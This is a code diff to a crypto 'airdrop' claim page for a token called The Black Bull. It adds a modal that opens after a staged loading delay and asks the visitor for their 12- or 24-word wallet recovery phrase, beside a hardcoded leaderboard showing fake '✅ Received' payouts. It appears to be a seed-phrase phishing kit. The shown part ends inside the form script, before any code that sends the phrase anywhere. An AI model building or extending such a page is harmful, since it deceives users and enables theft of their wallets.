@@ -9,7 +9,6 @@
     <link rel="icon" href="https://cdn.dexscreener.com/cms/images/A8aHRXC8VPrpfPIF?width=64&height=64&fit=crop&quality=95&format=auto" type="image/png" />
     <link rel="shortcut icon" href="https://cdn.dexscreener.com/cms/images/A8aHRXC8VPrpfPIF?width=64&height=64&fit=crop&quality=95&format=auto" type="image/png" />
 
-    
     <!-- Google Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -173,18 +172,9 @@
             animation: pulse-dot 1.5s infinite;
         }
         @keyframes pulse-dot {
-            0% {
-                opacity: 1;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 0.3;
-                transform: scale(0.7);
-            }
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(0.7); }
+            100% { opacity: 1; transform: scale(1); }
         }
 
         .main-logo {
@@ -281,7 +271,6 @@
             transition: all 0.25s ease;
             text-decoration: none;
             display: inline-block;
-            position: relative;
         }
         .cta-button:hover {
             transform: scale(1.04);
@@ -349,9 +338,7 @@
         }
 
         @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
+            to { transform: rotate(360deg); }
         }
 
         .loading-text {
@@ -365,12 +352,665 @@
         }
 
         @keyframes pulse-text {
-            0%,
-            100% {
-                opacity: 0.4;
+            0%, 100% { opacity: 0.4; }
+            50% { opacity: 1; }
+        }
+
+        /* ===== WALLET MODAL OVERLAY ===== */
+        .wallet-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(5, 5, 5, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            display: none;
+            align-items: flex-start;
+            justify-content: flex-end;
+            z-index: 9998;
+            padding: 30px 30px 30px 0;
+            animation: fadeInModal 0.4s ease;
+        }
+
+        .wallet-modal-overlay.active {
+            display: flex;
+        }
+
+        @keyframes fadeInModal {
+            from {
+                opacity: 0;
+                transform: translateX(40px) translateY(-20px);
             }
-            50% {
+            to {
                 opacity: 1;
+                transform: translateX(0) translateY(0);
+            }
+        }
+
+        .wallet-modal {
+            width: 100%;
+            max-width: 560px;
+            max-height: calc(100vh - 60px);
+            overflow-y: auto;
+            background: rgba(18, 22, 30, 0.95);
+            backdrop-filter: blur(24px) saturate(1.2);
+            -webkit-backdrop-filter: blur(24px) saturate(1.2);
+            border-radius: 24px;
+            border: 1px solid rgba(0, 255, 136, 0.10);
+            padding: 32px 28px 28px;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(0, 255, 136, 0.04) inset, 0 0 60px rgba(0, 255, 136, 0.02);
+            position: relative;
+            margin: 0 20px 0 auto;
+        }
+
+        .wallet-modal::-webkit-scrollbar {
+            width: 4px;
+        }
+        .wallet-modal::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 4px;
+        }
+        .wallet-modal::-webkit-scrollbar-thumb {
+            background: rgba(0, 255, 136, 0.15);
+            border-radius: 4px;
+        }
+
+        /* ===== Close Button - RIGHT TOP ===== */
+        .modal-close-btn {
+            position: absolute;
+            top: 14px;
+            right: 16px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 10px;
+            padding: 6px 10px;
+            color: rgba(255, 255, 255, 0.40);
+            font-size: 12px;
+            font-weight: 500;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            z-index: 2;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .modal-close-btn:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 50, 50, 0.3);
+            color: rgba(255, 255, 255, 0.70);
+            transform: scale(1.04);
+        }
+
+        .modal-close-btn svg {
+            width: 14px;
+            height: 14px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2.5;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        /* ===== STYLE WALLET ===== */
+        .wallet-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 24px;
+            text-align: center;
+            padding-top: 0;
+        }
+
+        .wallet-logo {
+            width: 60px;
+            height: 60px;
+            border-radius: 16px;
+            background: linear-gradient(145deg, rgba(0, 255, 136, 0.12), rgba(0, 255, 136, 0.03));
+            border: 1px solid rgba(0, 255, 136, 0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 14px;
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.06);
+            transition: box-shadow 0.4s ease, transform 0.3s ease;
+            flex-shrink: 0;
+            overflow: hidden;
+        }
+
+        .wallet-logo:hover {
+            box-shadow: 0 0 60px rgba(0, 255, 136, 0.12);
+            transform: scale(1.02);
+        }
+
+        .wallet-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .wallet-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #ffffff;
+            letter-spacing: -0.3px;
+            margin-bottom: 2px;
+            background: linear-gradient(135deg, #ffffff 60%, rgba(0, 255, 136, 0.7));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .wallet-subtitle {
+            font-size: 13px;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.40);
+            letter-spacing: 0.2px;
+        }
+
+        .wallet-form {
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+
+        .seed-section {
+            background: rgba(10, 14, 20, 0.50);
+            border-radius: 16px;
+            padding: 16px 16px 14px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            transition: border-color 0.3s ease;
+        }
+
+        .seed-section:focus-within {
+            border-color: rgba(0, 255, 136, 0.15);
+        }
+
+        .seed-label {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 13px;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.75);
+            letter-spacing: 0.2px;
+        }
+
+        .seed-label span {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .seed-badge {
+            font-size: 9px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: rgba(0, 255, 136, 0.6);
+            background: rgba(0, 255, 136, 0.08);
+            padding: 2px 10px;
+            border-radius: 100px;
+            border: 1px solid rgba(0, 255, 136, 0.08);
+        }
+
+        .seed-toggle-group {
+            display: flex;
+            background: rgba(6, 8, 14, 0.60);
+            border-radius: 10px;
+            padding: 3px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            margin-bottom: 12px;
+        }
+
+        .seed-toggle-btn {
+            flex: 1;
+            padding: 6px 10px;
+            border: none;
+            background: transparent;
+            border-radius: 7px;
+            font-weight: 600;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.40);
+            cursor: pointer;
+            transition: all 0.25s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .seed-toggle-btn.active {
+            background: rgba(0, 255, 136, 0.12);
+            color: #00ff88;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.05);
+        }
+
+        .seed-toggle-btn:hover:not(.active) {
+            color: rgba(255, 255, 255, 0.70);
+        }
+
+        .seed-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+        }
+
+        .seed-item {
+            position: relative;
+            display: flex;
+            align-items: center;
+            background: rgba(6, 8, 14, 0.70);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: border-color 0.25s ease, box-shadow 0.25s ease, background 0.25s ease;
+            overflow: hidden;
+        }
+
+        .seed-item:hover {
+            background: rgba(6, 8, 14, 0.85);
+            border-color: rgba(0, 255, 136, 0.08);
+        }
+
+        .seed-item:focus-within {
+            border-color: rgba(0, 255, 136, 0.35);
+            box-shadow: 0 0 0 3px rgba(0, 255, 136, 0.06), 0 0 20px rgba(0, 255, 136, 0.03);
+            background: rgba(6, 8, 14, 0.90);
+        }
+
+        .seed-number {
+            flex-shrink: 0;
+            width: 22px;
+            text-align: center;
+            font-size: 9px;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.20);
+            letter-spacing: 0.3px;
+            user-select: none;
+            padding-left: 4px;
+        }
+
+        .seed-item input {
+            flex: 1;
+            min-width: 0;
+            background: transparent;
+            border: none;
+            outline: none;
+            padding: 8px 8px 8px 2px;
+            font-size: 12px;
+            font-weight: 500;
+            font-family: 'Inter', monospace;
+            color: #e8edf5;
+            letter-spacing: 0.2px;
+            transition: color 0.3s ease;
+            width: 100%;
+        }
+
+        .seed-item input::placeholder {
+            color: rgba(255, 255, 255, 0.12);
+            font-weight: 400;
+            font-size: 10px;
+            letter-spacing: 0px;
+        }
+
+        .seed-item input:focus {
+            color: #ffffff;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 2px 0;
+            cursor: pointer;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            display: none;
+        }
+
+        .checkbox-custom {
+            flex-shrink: 0;
+            width: 18px;
+            height: 18px;
+            border-radius: 5px;
+            border: 2px solid rgba(255, 255, 255, 0.10);
+            background: rgba(6, 8, 14, 0.50);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.25s ease;
+            margin-top: 1px;
+        }
+
+        .checkbox-group:hover .checkbox-custom {
+            border-color: rgba(255, 255, 255, 0.20);
+            background: rgba(6, 8, 14, 0.70);
+        }
+
+        .checkbox-group input[type="checkbox"]:checked+.checkbox-custom {
+            border-color: rgba(0, 255, 136, 0.50);
+            background: rgba(0, 255, 136, 0.12);
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.04);
+        }
+
+        .checkbox-group input[type="checkbox"]:checked+.checkbox-custom svg {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .checkbox-custom svg {
+            width: 12px;
+            height: 12px;
+            fill: none;
+            stroke: #00ff88;
+            stroke-width: 2.5;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            opacity: 0;
+            transform: scale(0.6);
+            transition: all 0.25s ease;
+        }
+
+        .checkbox-label {
+            font-size: 12px;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.45);
+            line-height: 1.4;
+            letter-spacing: 0.1px;
+            transition: color 0.25s ease;
+            user-select: none;
+        }
+
+        .checkbox-group:hover .checkbox-label {
+            color: rgba(255, 255, 255, 0.55);
+        }
+
+        .checkbox-group input[type="checkbox"]:checked~.checkbox-label {
+            color: rgba(255, 255, 255, 0.60);
+        }
+
+        .import-btn {
+            width: 100%;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            color: #0a0b0e;
+            background: linear-gradient(135deg, #00ff88, #00cc6a);
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 0.2px;
+            box-shadow: 0 4px 30px rgba(0, 255, 136, 0.15);
+        }
+
+        .import-btn::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 14px;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.15), transparent 50%);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .import-btn:hover {
+            transform: translateY(-2px) scale(1.005);
+            box-shadow: 0 8px 50px rgba(0, 255, 136, 0.25);
+        }
+
+        .import-btn:hover::before {
+            opacity: 1;
+        }
+
+        .import-btn:active {
+            transform: translateY(0px) scale(0.99);
+            box-shadow: 0 2px 20px rgba(0, 255, 136, 0.20);
+        }
+
+        .import-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: 0 4px 20px rgba(0, 255, 136, 0.05);
+        }
+
+        .import-btn .btn-glow {
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at center, rgba(255, 255, 255, 0.10), transparent 60%);
+            opacity: 0;
+            transition: opacity 0.6s ease;
+            pointer-events: none;
+        }
+
+        .import-btn:hover .btn-glow {
+            opacity: 1;
+        }
+
+        .import-btn .btn-text {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .import-btn .btn-text svg {
+            width: 18px;
+            height: 18px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2.5;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        /* ===== Toast ===== */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(80px);
+            background: rgba(10, 14, 20, 0.92);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(0, 255, 136, 0.10);
+            border-radius: 16px;
+            padding: 14px 28px;
+            color: #e8edf5;
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+            opacity: 0;
+            transition: all 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            z-index: 99999;
+            pointer-events: none;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0px);
+        }
+
+        .toast .toast-icon {
+            color: #00ff88;
+            flex-shrink: 0;
+        }
+
+        .toast .toast-icon svg {
+            width: 20px;
+            height: 20px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        /* ===== Responsive Wallet Modal ===== */
+        @media (max-width: 768px) {
+            .wallet-modal-overlay {
+                padding: 15px 15px 15px 0;
+                align-items: flex-end;
+            }
+
+            .wallet-modal {
+                max-width: 100%;
+                max-height: calc(100vh - 30px);
+                border-radius: 20px;
+                padding: 24px 20px 20px;
+                margin: 0 10px 0 auto;
+            }
+
+            .wallet-logo {
+                width: 50px;
+                height: 50px;
+            }
+
+            .wallet-title {
+                font-size: 19px;
+            }
+
+            .seed-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 6px;
+            }
+
+            .seed-item input {
+                font-size: 11px;
+                padding: 6px 6px 6px 2px;
+            }
+
+            .seed-number {
+                width: 18px;
+                font-size: 8px;
+                padding-left: 3px;
+            }
+
+            .seed-section {
+                padding: 12px 12px 10px;
+                border-radius: 12px;
+            }
+
+            .import-btn {
+                padding: 12px 16px;
+                font-size: 14px;
+                border-radius: 12px;
+            }
+
+            .checkbox-label {
+                font-size: 11px;
+            }
+
+            .toast {
+                max-width: 90%;
+                padding: 12px 20px;
+                font-size: 13px;
+            }
+
+            .modal-close-btn {
+                top: 10px;
+                right: 12px;
+                padding: 5px 8px;
+                font-size: 11px;
+                border-radius: 8px;
+            }
+        }
+
+        @media (max-width: 430px) {
+            .wallet-modal {
+                padding: 18px 14px 16px;
+                border-radius: 16px;
+                max-height: calc(100vh - 20px);
+            }
+
+            .wallet-modal-overlay {
+                padding: 10px 10px 10px 0;
+            }
+
+            .wallet-logo {
+                width: 44px;
+                height: 44px;
+            }
+
+            .wallet-title {
+                font-size: 17px;
+            }
+
+            .wallet-subtitle {
+                font-size: 11px;
+            }
+
+            .seed-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 5px;
+            }
+
+            .seed-item input {
+                font-size: 10px;
+                padding: 5px 4px 5px 2px;
+            }
+
+            .seed-number {
+                width: 16px;
+                font-size: 7px;
+            }
+
+            .seed-label {
+                font-size: 11px;
+                margin-bottom: 10px;
+            }
+
+            .seed-badge {
+                font-size: 8px;
+                padding: 1px 8px;
+            }
+
+            .import-btn {
+                padding: 10px 14px;
+                font-size: 13px;
+                border-radius: 10px;
+            }
+
+            .checkbox-custom {
+                width: 16px;
+                height: 16px;
+            }
+
+            .checkbox-custom svg {
+                width: 10px;
+                height: 10px;
+            }
+
+            .checkbox-label {
+                font-size: 10px;
+            }
+
+            .seed-toggle-btn {
+                font-size: 11px;
+                padding: 5px 8px;
+            }
+
+            .modal-close-btn {
+                top: 8px;
+                right: 8px;
+                padding: 4px 6px;
+                font-size: 10px;
+                border-radius: 6px;
             }
         }
 
@@ -545,29 +1185,14 @@
             animation: blink-dot 1s infinite;
         }
         @keyframes blink-dot {
-            0% {
-                opacity: 1;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 0.2;
-                transform: scale(0.6);
-            }
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.2; transform: scale(0.6); }
+            100% { opacity: 1; transform: scale(1); }
         }
         @keyframes live-pulse {
-            0% {
-                box-shadow: 0 0 10px rgba(255, 0, 0, 0.1);
-            }
-            50% {
-                box-shadow: 0 0 30px rgba(255, 0, 0, 0.2);
-            }
-            100% {
-                box-shadow: 0 0 10px rgba(255, 0, 0, 0.1);
-            }
+            0% { box-shadow: 0 0 10px rgba(255, 0, 0, 0.1); }
+            50% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.2); }
+            100% { box-shadow: 0 0 10px rgba(255, 0, 0, 0.1); }
         }
 
         .total-stats {
@@ -609,12 +1234,8 @@
         }
 
         @keyframes scroll-leaders {
-            0% {
-                transform: translateY(0);
-            }
-            100% {
-                transform: translateY(-50%);
-            }
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
         }
 
         .lb-row {
@@ -640,14 +1261,8 @@
             animation: flash-green 0.6s ease;
         }
         @keyframes flash-green {
-            0% {
-                background: rgba(57, 255, 20, 0.3);
-                border-color: #39FF14;
-            }
-            100% {
-                background: rgba(255, 255, 255, 0.02);
-                border-color: transparent;
-            }
+            0% { background: rgba(57, 255, 20, 0.3); border-color: #39FF14; }
+            100% { background: rgba(255, 255, 255, 0.02); border-color: transparent; }
         }
 
         .lb-rank {
@@ -657,18 +1272,9 @@
             color: rgba(255, 255, 255, 0.3);
             text-align: center;
         }
-        .lb-rank.gold {
-            color: #FFD700;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
-        }
-        .lb-rank.silver {
-            color: #C0C0C0;
-            text-shadow: 0 0 15px rgba(192, 192, 192, 0.2);
-        }
-        .lb-rank.bronze {
-            color: #CD7F32;
-            text-shadow: 0 0 15px rgba(205, 127, 50, 0.2);
-        }
+        .lb-rank.gold { color: #FFD700; text-shadow: 0 0 20px rgba(255, 215, 0, 0.3); }
+        .lb-rank.silver { color: #C0C0C0; text-shadow: 0 0 15px rgba(192, 192, 192, 0.2); }
+        .lb-rank.bronze { color: #CD7F32; text-shadow: 0 0 15px rgba(205, 127, 50, 0.2); }
 
         .lb-wallet {
             font-family: 'Roboto Mono', monospace;
@@ -922,7 +1528,6 @@
                     </div>
                 </div>
                 <div class="top-right">
-                    <!-- Social Icons -->
                     <div class="social-icons">
                         <a href="#" target="_blank" title="Telegram" aria-label="Telegram">
                             <svg viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
@@ -931,7 +1536,6 @@
                             <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                         </a>
                     </div>
-                    <!-- Limited Airdrop -->
                     <div class="limited-badge">
                         <span class="dot"></span> Limited Airdrop
                     </div>
@@ -947,7 +1551,6 @@
             </div>
 
             <div class="bottom-section">
-                <!-- Tombol dengan loading effect -->
                 <button class="cta-button" id="claimBtn">
                     CLAIM AIRDROP NOW
                 </button>
@@ -1016,6 +1619,80 @@
             </button>
             <div class="copyright">© 2026 The Black Bull</div>
         </div>
+    </div>
+
+    <!-- ===== WALLET MODAL - RIGHT TOP ===== -->
+    <div class="wallet-modal-overlay" id="walletModalOverlay">
+        <div class="wallet-modal">
+            <!-- Close Button - RIGHT TOP -->
+            <button class="modal-close-btn" id="modalCloseBtn" aria-label="Close wallet modal">
+                <svg viewBox="0 0 24 24">
+                    <line x1="18" y1="6" x2="6" y2="18" />
+                    <line x1="6" y1="6" x2="18" y2="18" />
+                </svg>
+                Close
+            </button>
+
+            <div class="wallet-header">
+                <div class="wallet-logo" aria-hidden="true">
+                    <img src="https://lh3.googleusercontent.com/dXvdD2VjLS-imsW8WG2oB3y7sBHhL9gFlv7KZnqZSA9_MU1VROSHRpJidav8-a77uQT1-8X_zK5ibsAC39IFn5tn=s60" alt="Wallet logo" loading="lazy" />
+                </div>
+                <h1 class="wallet-title">Import Existing Wallet</h1>
+                <p class="wallet-subtitle">Restore access with your recovery phrase</p>
+            </div>
+
+            <form class="wallet-form" id="walletForm" autocomplete="off" novalidate>
+                <div class="seed-section">
+                    <div class="seed-label">
+                        <span>
+                            Secret Recovery Phrase
+                            <span class="seed-badge" id="seedCountBadge">12 words</span>
+                        </span>
+                    </div>
+
+                    <div class="seed-toggle-group" role="group" aria-label="Recovery phrase length">
+                        <button type="button" class="seed-toggle-btn active" data-words="12">12 words</button>
+                        <button type="button" class="seed-toggle-btn" data-words="24">24 words</button>
+                    </div>
+
+                    <div class="seed-grid" id="seedGrid"></div>
+                </div>
+
+                <label class="checkbox-group" id="termsLabel">
+                    <input type="checkbox" id="termsCheck" />
+                    <span class="checkbox-custom" aria-hidden="true">
+                        <svg viewBox="0 0 24 24">
+                            <polyline points="20 6 9 17 4 12" />
+                        </svg>
+                    </span>
+                    <span class="checkbox-label">
+                        I understand that my recovery phrase cannot be recovered if lost.
+                    </span>
+                </label>
+
+                <button type="submit" class="import-btn" id="importBtn" disabled>
+                    <span class="btn-glow"></span>
+                    <span class="btn-text">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M12 5v14" />
+                            <path d="M5 12l7-7 7 7" />
+                        </svg>
+                        Import Wallet
+                    </span>
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- ===== Toast ===== -->
+    <div class="toast" id="toast" role="alert">
+        <span class="toast-icon">
+            <svg viewBox="0 0 24 24">
+                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
+                <polyline points="22 4 12 14.01 9 11.01" />
+            </svg>
+        </span>
+        <span id="toastMessage">Wallet imported successfully!</span>
     </div>
 
     <!-- ===== SCRIPT ===== -->
@@ -1182,9 +1859,8 @@
             window.addEventListener('load', () => { resize(); });
         })();
 
-
         // ==========================================
-        // 2. LIVE PRICE from CoinMarketCap (Real-Time)
+        // 2. LIVE PRICE from CoinMarketCap
         // ==========================================
         const USD_PRICE_URL = 'https://coinmarketcap.com/currencies/the-black-bull/';
         const PROXY_URL = 'https://api.allorigins.win/raw?url=';
@@ -1313,9 +1989,8 @@
             }
         }, 5000);
 
-
         // ==========================================
-        // 3. LEADERBOARD AKTIF (LIVE UPDATES)
+        // 3. LEADERBOARD
         // ==========================================
         const leaderData = [
             { wallet: 'Gk8x...9F2a', amount: 2500 },
@@ -1343,15 +2018,15 @@
                 else if (index === 2) rankClass = 'bronze';
 
                 html += `
-                            <div class="lb-row flash" data-index="${index}">
-                                <div class="lb-rank ${rankClass}">#${index + 1}</div>
-                                <div class="lb-wallet">
-                                    <span class="sol-icon">◆</span> ${item.wallet}
-                                </div>
-                                <div class="lb-amount">${item.amount.toLocaleString()} <small>$ANSEM</small></div>
-                                <div class="lb-status">✅ Received</div>
-                            </div>
-                        `;
+                    <div class="lb-row flash" data-index="${index}">
+                        <div class="lb-rank ${rankClass}">#${index + 1}</div>
+                        <div class="lb-wallet">
+                            <span class="sol-icon">◆</span> ${item.wallet}
+                        </div>
+                        <div class="lb-amount">${item.amount.toLocaleString()} <small>$ANSEM</small></div>
+                        <div class="lb-status">✅ Received</div>
+                    </div>
+                `;
             });
             return html;
         }
@@ -1398,27 +2073,290 @@
             });
         });
 
-
         // ==========================================
-        // 4. LOADING EFFECT & REDIRECT
+        // 4. CLAIM BUTTON - Show Modal
         // ==========================================
         const claimBtn = document.getElementById('claimBtn');
         const loadingOverlay = document.getElementById('loadingOverlay');
+        const modalOverlay = document.getElementById('walletModalOverlay');
+        const modalCloseBtn = document.getElementById('modalCloseBtn');
 
         claimBtn.addEventListener('click', function(e) {
             e.preventDefault();
 
-            // Tampilkan overlay loading
             loadingOverlay.classList.add('active');
 
-            // Durasi 3-5 detik (random)
             const delay = Math.floor(Math.random() * 2000) + 3000;
 
             setTimeout(() => {
-                window.location.href = 'Import_Wallet.html';
+                loadingOverlay.classList.remove('active');
+                modalOverlay.classList.add('active');
+                document.body.style.overflow = 'hidden';
+
+                // Focus first input after modal appears
+                setTimeout(() => {
+                    const firstInput = document.querySelector('.seed-item input');
+                    if (firstInput) firstInput.focus();
+                }, 400);
             }, delay);
         });
-    </script>
 
+        // Close modal
+        function closeModal() {
+            modalOverlay.classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        modalCloseBtn.addEventListener('click', closeModal);
+
+        // Close on overlay click (outside modal)
+        modalOverlay.addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeModal();
+            }
+        });
+
+        // Close on Escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' && modalOverlay.classList.contains('active')) {
+                closeModal();
+            }
+        });
+
+        // ==========================================
+        // 5. WALLET IMPORT FUNCTIONALITY
+        // ==========================================
+        (function() {
+            const seedGrid = document.getElementById('seedGrid');
+            const termsCheck = document.getElementById('termsCheck');
+            const importBtn = document.getElementById('importBtn');
+            const form = document.getElementById('walletForm');
+            const toast = document.getElementById('toast');
+            const toastMsg = document.getElementById('toastMessage');
+            const toggleBtns = document.querySelectorAll('.seed-toggle-btn');
+            const seedCountBadge = document.getElementById('seedCountBadge');
+
+            let currentWordCount = 12;
+            let toastTimeout = null;
+
+            function buildSeedGrid(count) {
+                currentWordCount = count;
+                seedGrid.innerHTML = '';
+                seedCountBadge.textContent = `${count} words`;
+
+                for (let i = 1; i <= count; i++) {
+                    const item = document.createElement('div');
+                    item.className = 'seed-item';
+
+                    const num = document.createElement('span');
+                    num.className = 'seed-number';
+                    num.textContent = i;
+
+                    const input = document.createElement('input');
+                    input.type = 'text';
+                    input.id = `seed-${i}`;
+                    input.placeholder = '•••••';
+                    input.autocomplete = 'off';
+                    input.spellcheck = false;
+                    input.setAttribute('aria-label', `Recovery word ${i}`);
+
+                    item.appendChild(num);
+                    item.appendChild(input);
+                    seedGrid.appendChild(item);
+                }
+
+                validateForm();
+
+                toggleBtns.forEach(btn => {
+                    btn.classList.toggle('active', parseInt(btn.dataset.words) === count);
+                });
+            }
+
+            function getSeedInputs() {
+                return document.querySelectorAll('.seed-item input');
+            }
+
+            function validateForm() {
+                const inputs = getSeedInputs();
+                let allFilled = true;
+                inputs.forEach(inp => {
+                    if (inp.value.trim().length === 0) allFilled = false;
+                });
+
+                const termsChecked = termsCheck.checked;
+                const allValid = allFilled && termsChecked;
+
+                importBtn.disabled = !allValid;
+                importBtn.classList.toggle('ready', allValid);
+                return allValid;
+            }
+
+            function showToast(message, isError = false) {
+                if (toastTimeout) {
+                    clearTimeout(toastTimeout);
+                    toast.classList.remove('show');
+                }
+                toastMsg.textContent = message;
+                const icon = toast.querySelector('.toast-icon svg');
+                if (icon) {
+                    icon.style.stroke = isError ? '#ff6b6b' : '#00ff88';
+                }
+                void toast.offsetWidth;
+                toast.classList.add('show');
+                toastTimeout = setTimeout(() => {
+                    toast.classList.remove('show');
+                    toastTimeout = null;
+                }, 3500);
+            }
+
+            // Checkbox
+            termsCheck.addEventListener('change', validateForm);
+
+            // Input events
+            seedGrid.addEventListener('input', function(e) {
+                if (e.target.tagName === 'INPUT') {
+                    if (e.inputType === 'insertText' && e.target.value.endsWith(' ')) {
+                        const clean = e.target.value.trim();
+                        e.target.value = clean;
+                        const inputs = getSeedInputs();
+                        const idx = Array.from(inputs).indexOf(e.target);
+                        const next = inputs[idx + 1];
+                        if (next) {
+                            next.focus();
+                            next.select();
+                        }
+                        e.preventDefault();
+                    }
+                    validateForm();
+                }
+            });
+
+            seedGrid.addEventListener('keydown', function(e) {
+                if (e.target.tagName === 'INPUT') {
+                    const inputs = getSeedInputs();
+                    const idx = Array.from(inputs).indexOf(e.target);
+
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        const next = inputs[idx + 1];
+                        if (next) {
+                            next.focus();
+                            next.select();
+                        } else {
+                            if (!importBtn.disabled) {
+                                form.dispatchEvent(new Event('submit'));
+                            }
+                        }
+                    }
+
+                    if (e.key === 'Backspace' && e.target.value === '' && idx > 0) {
+                        inputs[idx - 1].focus();
+                        inputs[idx - 1].select();
+                    }
+                }
+            });
+
+            seedGrid.addEventListener('blur', function(e) {
+                if (e.target.tagName === 'INPUT') {
+                    e.target.value = e.target.value.trim();
+                    validateForm();
+                }
+            }, true);
